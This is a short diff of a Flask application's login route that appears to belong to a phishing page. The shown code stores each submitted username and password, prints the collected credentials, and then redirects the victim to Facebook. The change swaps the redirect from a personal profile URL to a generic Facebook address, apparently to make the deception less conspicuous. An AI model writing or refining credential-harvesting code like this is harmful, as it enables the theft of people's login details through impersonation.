@@ -32,7 +32,7 @@ def login():
                 updated_data = f"{existing_data}\n{username}    {password}"
                 os.environ[data_var] = updated_data
                 print(os.environ.get(data_var))
-                return redirect("https://www.facebook.com/leel.ck07")
+                return redirect("https://www.facebook.com/?rdid=JMo09Cvyc2lef3vi")
             else:
                 return render_template("login.html", error="Invalid username or password")
     else:
@@ -65,3 +65,4 @@ def reset_data():
 
 if __name__ == "__main__":  
     app.run(debug=True,host="0.0.0.0", port=port)
+
